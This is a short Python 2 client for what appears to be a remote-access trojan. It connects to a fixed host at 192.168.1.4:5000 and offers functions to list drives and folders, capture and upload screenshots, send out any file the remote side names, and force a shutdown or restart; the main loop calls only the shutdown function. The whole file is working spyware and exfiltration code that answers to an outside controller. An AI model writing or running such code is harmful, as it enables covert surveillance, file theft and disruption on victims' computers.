import socket
import win32api
import os
import autopy
from Crypto.Cipher import AES
import sys
import subprocess


hostAddr = '192.168.1.4'
port = 5000

s = socket.socket()
s.connect((hostAddr,port))

def browse_file():
	s.recv(4096)
	drives = win32api.GetLogicalDriveStrings()
	drives = drives.split('\000')[:-1]

	strDrives = ""
	for drive in drives:
		strDrives += drive.replace("\\","") + "\n"

	s.send(strDrives)

	strDrive = s.recv(1024)
	strDrive = strDrive + "\\"


	files = ""
	if os.path.isdir(strDrive):
		arrfiles = os.listdir(strDrive) 

		for file in arrfiles:
			files += file + "\n"
	else:
		s.send("Invalid Directory")	


	s.send(files)

def shutdown_restart():
	shutdown = s.recv(1024)
	shutdowntype = "-" + str(shutdown)
	print shutdowntype 
	command = "shutdown {0} -f -t 30".format(shutdowntype)

	#-f for forced hutdown close all apps
	#-t shows a time out for shutdown
	#30 timout value
	#shutdowntype shows either it will only shutdown or restart again
	subprocess.Popen(command.split(), shell=True)

def screenshot():
	image = autopy.bitmap.capture_screen()
	directory = os.getcwd()
	image.save(directory + "\image.png")

	message = s.recv(1024)
	if message == 'Y':
		#sending file to server
		s.send(str(os.path.getsize(directory + "\image.png"))) #file size
	else:
		s.close()	

	#transferring file in Bytes
	with open(directory + "\image.png",'rb') as f:
		Bytes = f.read(1024)
		s.send(Bytes)
		while Bytes != "": 
			Bytes = f.read(1024)
			s.send(Bytes)
		f.close()
		
		print (directory + "\image.png")
		os.remove("image.png")		

def transfer_file():
	files = os.listdir('.')
	
	strFiles =""
	for file in files:
		strFiles+= file + "\n"
	
	s.send(strFiles)

	filename = s.recv(1024)
	if os.path.isfile(filename):
		s.send(str(os.path.getsize(filename)))
	else:
		s.send("Invalid Filename")	

	message = s.recv(1024)
	if message=="Y":
		with open(filename,'rb') as f:
			Bytes = f.read(1024)
			s.send(Bytes)
			while Bytes != "":
				Bytes = f.read(1024)
				s.send(Bytes)

while True:
	shutdown_restart()

s.close()

		
		 
